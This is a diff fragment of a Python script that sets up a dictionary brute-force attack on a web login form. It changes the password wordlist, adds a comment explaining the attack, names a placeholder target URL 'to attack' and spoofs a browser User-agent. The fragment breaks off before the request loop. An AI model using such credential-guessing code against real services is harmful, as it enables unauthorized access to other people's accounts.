@@ -1,6 +1,7 @@
 import requests
 
-dictionary = open("ssh-betterdefaultpasslist.txt", "r").read().split("\n")
+# Brute forcing a POST request login with a dictionary in this format   user:password
+dictionary = open("mydict.txt", "r").read().split("\n")
 url = "http://targeturl:targetport/" # URL to attack
 myheaders = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.2651.74'} 
 mydata = {
